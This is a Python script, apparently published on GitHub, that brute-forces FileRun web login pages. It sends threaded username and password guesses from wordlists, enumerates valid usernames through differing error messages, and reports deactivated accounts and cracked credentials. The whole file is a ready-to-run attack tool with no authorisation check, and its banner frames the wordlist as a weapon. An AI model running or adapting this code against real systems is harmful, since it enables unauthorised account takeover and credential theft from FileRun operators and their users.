#!/usr/bin/env python3
"""
FileRun Brute Force (updated)
- Default: silent mode
- Pause on VALID USERNAME or ACCOUNT DEACTIVATED and ask user whether to stop or continue
"""

import sys
import os
import json
import argparse
import threading
import time
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
from urllib.parse import urljoin
import requests
from termcolor import colored
from itertools import cycle

thread_local = threading.local()


def show_banner():
    banner = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣶⣶⣶⣶⣶⣶⣦⣀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⢤⣠⣶⣿⣿⡿⠿⠛⠛⠛⠛⠉⠛⠛⠛⠛⠿⣷⡦⠞⣩⣶⣸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣾⡤⣌⠙⠻⣅⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠋⢀⣾⣿⣿⠃⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⡟⢇⢻⣧⠄⠀⠈⢓⡢⠴⠒⠒⠒⠒⡲⠚⠁⠀⠐⣪⣿⣿⡿⡄⣿⣷⡄⠀⠀⠀⠀⠀    [ FileRun Brute Force ]
⠀⠀⠀⣠⣿⣿⠟⠁⠸⡼⣿⡂⠀⠀⠈⠁⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠉⠹⣿⣧⢳⡏⠹⣷⡄⠀⠀⠀⠀    Analyzing the target. Preparing the payload. 
⠀⠀⣰⣿⡿⠃⠀⠀⠀⢧⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠇⡸⠀⠀⠘⢿⣦⣄⠀⠀    Remember: the wordlist is your primary weapon. Happy hunting :)
⠀⢰⣿⣿⠃⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠀⠀⠀⠀⠀⠀⠰⡇⠀⠀⠀⠈⣿⣿⣆⠀    ------------------------
⠀⣿⣿⡇⠀⠀⠀⠀⢰⠇⠀⢺⡇⣄⠀⠀⠀⠀⣤⣶⣀⣿⠃⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠸⣿⣿⡀    github.com/mzrismuarf
⢸⣿⣿⠀⠀⠀⠀⠀⢽⠀⢀⡈⠉⢁⣀⣀⠀⠀⠀⠉⣉⠁⠀⠀⠀⣀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⣿⣿⡇
⢸⣿⡟⠀⠀⠀⠠⠀⠈⢧⡀⠀⠀⠀⠹⠁⠀⠀⠀⠀⠀⠀⠠⢀⠀⠀⠀⠀⠀⢼⠁⠀⠀⠀⠀⠀⢹⣿⡇
⢸⣿⣿⠀⠀⠀⠀⠀⠠⠀⠙⢦⣀⠠⠊⠉⠂⠄⠀⠀⠀⠈⠀⠀⠀⣀⣤⣤⡾⠘⡆⠀⠀⠀⠀⠀⣾⣿⡇
⠘⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⢠⠜⠳⣤⡀⠀⠀⣀⣤⡤⣶⣾⣿⣿⣿⠟⠁⠀⠀⡸⢦⣄⠀⠀⢀⣿⣿⠇
⠀⢿⣿⣧⠀⠀⠀⠀⠀⣠⣤⠞⠀⠀⠀⠙⠁⠙⠉⠀⠀⠸⣛⡿⠉⠀⠀⠀⢀⡜⠀⠀⠈⠙⠢⣼⣿⡿⠀
⠀⠈⣿⣿⣆⠀⠀⢰⠋⠡⡇⠀⡀⣀⣤⢢⣤⣤⣀⠀⠀⣾⠟⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⣰⣿⣿⠁⠀
⠀⠀⠈⢿⣿⣧⣀⡇⠀⡖⠁⢠⣿⣿⢣⠛⣿⣿⣿⣷⠞⠁⠀⠀⠈⠫⡉⠁⠀⠀⠀⠀⢀⣼⣿⠿⠃⠀⠀
⠀⠀⠀⠈⠻⣿⣿⣇⡀⡇⠀⢸⣿⡟⣾⣿⣿⣿⣿⠋⠀⠀⠀⢀⡠⠊⠁⠀⠀⠀⢀⣠⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣦⣀⢸⣿⢻⠛⣿⣿⡿⠁⠀⠀⣀⠔⠉⠀⠀⠀⠀⣀⣴⡿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣼⣿⣿⣟⠀⠀⡠⠊⠀⣀⣀⣠⣴⣶⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⣿⣿⣿⣿⣶⣶⣷⣶⣶⡿⠿⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
    print(colored(banner, "green"))



# spinner that coordinates on a lock so prints won't collide
def spinner(stop_event, counter, total, lock):
    spin = cycle(["|", "/", "-", "\\"])
    header = colored("[*] Brute-forcing |", "cyan")
    while not stop_event.is_set():
        sym = next(spin)
        with lock:
            done = counter['attempts']
            # spinner line (no newline)
            sys.stdout.write(f"\r{header} [{done}/{total}] {sym}")
            sys.stdout.flush()
        time.sleep(0.12)
    # clear line on stop
    with lock:
        sys.stdout.write("\r" + " " * 80 + "\r")
        sys.stdout.flush()


def get_session():
    if not hasattr(thread_local, "session"):
        thread_local.session = requests.Session()
    return thread_local.session


def attempt_login(host_url, user, pwd, line_no, timeout,
                  mode, verbose, print_lock, pause_event, found_event,
                  result_container, counter_lock, counter):
    """Perform one attempt and signal pause_event for interactive prompts when needed."""
    if found_event.is_set():
        return False

    session = get_session()
    payload = {
        'username': user,
        'password': pwd,
        'otp': '',
        'two_step_secret': '',
        'language': ''
    }

    try:
        resp = session.post(host_url, data=payload, timeout=timeout)
        text = resp.text.strip()
        text_lower = text.lower()
    except Exception as e:
        with print_lock:
            if verbose:
                print(colored(f"[x] Request failed on {user}:{pwd} -> {e}", "red"))
        with counter_lock:
            counter['attempts'] += 1
        return False

    with counter_lock:
        counter['attempts'] += 1
        attempt = counter['attempts']

    # classify response
    is_invalid_user = '"error":"invalid username."' in text_lower
    is_invalid_pass = '"error":"invalid password."' in text_lower
    is_deactivated = "your account has been deactivated" in text_lower or "account has been deactivated" in text_lower
    is_success = '"success":true' in text_lower or '"success":"1"' in text_lower

    # Decide event and printing. We DO NOT auto-stop on valid username: we pause and ask.
    if is_invalid_user:
        # invalid username — print only in verbose
        if verbose:
            with print_lock:
                print(colored(f"[!] {user}:{pwd} [invalid username] [line: {line_no}] (attempt {attempt})", "red"))
    elif is_invalid_pass:
        if mode == "username":
            # This indicates username exists (password wrong).
            with print_lock:
                print(colored(f"[+] VALID USERNAME FOUND: {user} [line: {line_no}] (attempt {attempt})", "cyan"))
            # record username
            result_container.setdefault('valid_users', []).append((user, line_no))
            # Pause and ask user (signal main thread)
            pause_event.set()
            # store context
            result_container['_last_event'] = ('valid_username', user, pwd, line_no, text)
        else:
            if verbose:
                with print_lock:
                    print(colored(f"[!] {user}:{pwd} [invalid password] [line: {line_no}] (attempt {attempt})", "red"))
    elif is_deactivated:
        with print_lock:
            print(colored(f"[!] ACCOUNT DEACTIVATED: {user}:{pwd} [line: {line_no}] (attempt {attempt})", "yellow"))
        result_container['deactivated'] = (user, pwd, line_no, text)
        # Pause and ask user
        pause_event.set()
        result_container['_last_event'] = ('deactivated', user, pwd, line_no, text)
    elif is_success:
        with print_lock:
            print(colored(f"[+] POSSIBLE VALID LOGIN: {user}:{pwd} [line: {line_no}] (attempt {attempt})", "green"))
            print(colored(f"    Response: {text[:200]}...", "yellow"))
        result_container['cred'] = (user, pwd, line_no, text)
        found_event.set()
    else:
        # unknown response -> treat as possible valid
        with print_lock:
            print(colored(f"[+] POSSIBLE VALID LOGIN: {user}:{pwd} [line: {line_no}] (attempt {attempt})", "green"))
            print(colored(f"    Response: {text[:200]}...", "yellow"))
        result_container['cred'] = (user, pwd, line_no, text)
        found_event.set()

    return True


def combos_generator(users, pwds, start_line):
    for idx, pwd in enumerate(pwds):
        line = start_line + idx
        for u in users:
            yield (u, pwd, line)


def prompt_range(total, label):
    print(colored(f"[!] {label} wordlist contains {total} lines", "yellow"))
    s = input(colored("[?] Enter custom range (y=all, e.g. 1-200): ", "cyan")).strip()
    if not s or s.lower() in ("y", "yes"):
        return 1, total
    if "-" in s:
        try:
            a, b = [int(x) for x in s.split("-", 1)]
            a = max(1, a)
            b = min(total, b)
            if a > b:
                a, b = b, a
            return a, b
        except Exception:
            return 1, total
    try:
        v = int(s)
        return 1, min(total, v)
    except Exception:
        return 1, total


def interactive_prompt_for_pause(result_container):
    """Main-thread interactive prompt when pause_event is set.
    Returns True to continue, False to stop the whole run."""
    last = result_container.get('_last_event')
    if not last:
        return True
    typ = last[0]
    if typ == 'valid_username':
        user = last[1]
        line = last[3]
        print(colored(f"\n[!] Found VALID USERNAME: {user} [line: {line}]", "cyan"))
        ans = input(colored("[?] Stop now and keep results (Y=stop, N=continue searching): ", "cyan")).strip().lower()
        return not (ans in ("y", "yes"))
    elif typ == 'deactivated':
        user = last[1]
        line = last[3]
        print(colored(f"\n[!] ACCOUNT DEACTIVATED: {user} [line: {line}]", "yellow"))
        ans = input(colored("[?] Stop now and investigate (Y=stop, N=continue searching): ", "cyan")).strip().lower()
        return not (ans in ("y", "yes"))
    return True


def main():
    parser = argparse.ArgumentParser(description="FileRun Brute Force")
    parser.add_argument("-u", "--host", help="Target host (e.g. http://10.1.2.10)")
    parser.add_argument("-l", "--username", help="Single username")
    parser.add_argument("-L", "--username-list", help="Username list file")
    parser.add_argument("-p", "--password", help="Single password")
    parser.add_argument("-P", "--password-list", help="Password list file")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout seconds")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output (disables silent default)")
    args = parser.parse_args()

    # if no args: show brief usage
    if len(sys.argv) == 1:
        show_banner()
        print("Usage examples:")
        print("  python3 run.py -u http://target.com/  -l admin -P rockyou.txt -t 100")
        print("  python3 run.py -u http://target.com/  -L users.txt -p 123 -t 100")
        sys.exit(0)

    # Mode detection
    if args.username_list and args.password:
        mode = "username"
    elif args.username and args.password_list:
        mode = "password"
    elif args.username_list and args.password_list:
        mode = "combo"
    else:
        print(colored("[x] Invalid parameter combination. Use (-L + -p) or (-l + -P).", "red"))
        sys.exit(1)

    threads = max(1, min(args.threads, 500))
    timeout = args.timeout
    verbose = args.verbose
    # default is silent unless verbose flag provided
    silent = not verbose

    # Load usernames
    if args.username:
        usernames = [args.username.strip()]
    elif args.username_list:
        if not os.path.isfile(args.username_list):
            print(colored(f"[x] Username list not found: {args.username_list}", "red"))
            sys.exit(1)
        with open(args.username_list, "r", encoding="utf-8", errors="ignore") as f:
            lines = [ln.strip() for ln in f if ln.strip()]
        start, end = prompt_range(len(lines), "Username")
        usernames = lines[start - 1:end]
    else:
        usernames = []

    # Load passwords
    if args.password:
        passwords = [args.password.strip()]
    elif args.password_list:
        if not os.path.isfile(args.password_list):
            print(colored(f"[x] Password list not found: {args.password_list}", "red"))
            sys.exit(1)
        with open(args.password_list, "r", encoding="utf-8", errors="ignore") as f:
            lines = [ln.strip() for ln in f if ln.strip()]
        start, end = prompt_range(len(lines), "Password")
        passwords = lines[start - 1:end]
    else:
        passwords = []

    total_attempts = len(usernames) * len(passwords)
    host_url = urljoin(args.host.rstrip('/') + '/', '?module=fileman&page=login&action=login')
    print(colored(f"[*] Starting brute-force ({len(usernames)} users × {len(passwords)} passwords = {total_attempts}, {threads} threads)", "yellow"))

    print_lock = threading.Lock()
    counter_lock = threading.Lock()
    counter = {'attempts': 0}
    found_event = threading.Event()
    pause_event = threading.Event()
    result_container = {}

    # spinner thread if in silent mode
    spinner_stop = threading.Event()
    if silent:
        spin_thread = threading.Thread(target=spinner, args=(spinner_stop, counter, total_attempts, print_lock), daemon=True)
        spin_thread.start()

    combos = combos_generator(usernames, passwords, 1)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = set()
        # submit initial batch
        for _ in range(min(threads, total_attempts)):
            try:
                u, p, ln = next(combos)
                fut = executor.submit(attempt_login, host_url, u, p, ln, timeout,
                                      mode, verbose, print_lock, pause_event, found_event,
                                      result_container, counter_lock, counter)
                futures.add(fut)
            except StopIteration:
                break

        try:
            # main loop: monitor futures and handle pause requests
            while futures and not found_event.is_set():
                # if paused by an event, break to handle interactively
                if pause_event.is_set():
                    # wait briefly for any in-flight prints to finish
                    time.sleep(0.05)
                    # ask user
                    continue_search = interactive_prompt_for_pause(result_container)
                    pause_event.clear()
                    if not continue_search:
                        # user wants to stop: set found_event to end
                        found_event.set()
                        break
                    # else continue: just keep running
                done, futures = wait(futures, return_when=FIRST_COMPLETED, timeout=0.5)
                # process completed
                for fut in done:
                    try:
                        fut.result()
                    except Exception as e:
                        with print_lock:
                            print(colored(f"[x] Thread error: {e}", "red"))
                    # refill
                    if not found_event.is_set() and not pause_event.is_set():
                        try:
                            u, p, ln = next(combos)
                            newf = executor.submit(attempt_login, host_url, u, p, ln, timeout,
                                                   mode, verbose, print_lock, pause_event, found_event,
                                                   result_container, counter_lock, counter)
                            futures.add(newf)
                        except StopIteration:
                            pass
                # small sleep to avoid busy loop
                time.sleep(0.01)

        except KeyboardInterrupt:
            with print_lock:
                print(colored("\n[!] Interrupted by user. Exiting...", "yellow"))
            found_event.set()

    if silent:
        spinner_stop.set()
        spin_thread.join()

    # Final summary (always print on new lines)
    print()
    if 'deactivated' in result_container:
        u, p, line, _ = result_container['deactivated']
        print(colored(f"[!] Account deactivated: {u}:{p} [line: {line}]", "yellow"))
        print(colored("    Suggestion: use a different username.\n", "yellow"))

    if mode == "username":
        valids = result_container.get('valid_users', [])
        if valids:
            print(colored(f"[+] USERNAME FOUND ({len(valids)}):", "cyan"))
            for v, ln in valids:
                print(colored(f"    {v} [line: {ln}]", "cyan"))
        else:
            print(colored("[~] No valid usernames found.", "yellow"))
    elif 'cred' in result_container:
        u, p, ln, res = result_container['cred']
        print(colored(f"[+] POSSIBLE VALID LOGIN: {u}:{p} [line: {ln}]", "green"))
        print(colored(f"[~] Response: {res[:300]}...", "yellow"))
    else:
        print(colored("[~] Brute-force finished. No valid results.", "yellow"))


if __name__ == "__main__":
    main()
